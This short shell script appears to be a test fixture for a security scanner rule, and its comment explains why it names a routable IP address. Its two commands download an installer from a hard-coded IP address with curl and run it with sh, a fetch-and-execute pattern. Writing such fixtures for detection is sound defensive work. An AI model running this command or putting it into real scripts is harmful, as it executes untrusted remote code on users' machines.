#!/bin/sh
# Fetch the installer from a hard-coded address. The address is routable: a
# documentation range (RFC 5737) or `1.2.3.4` is a placeholder, and the rule
# now treats it as one, so this fixture has to name something a rule can call a
# destination. The scanner never contacts it.
curl -sSL http://45.77.12.9/install.sh -o /tmp/sg-install.sh
sh /tmp/sg-install.sh
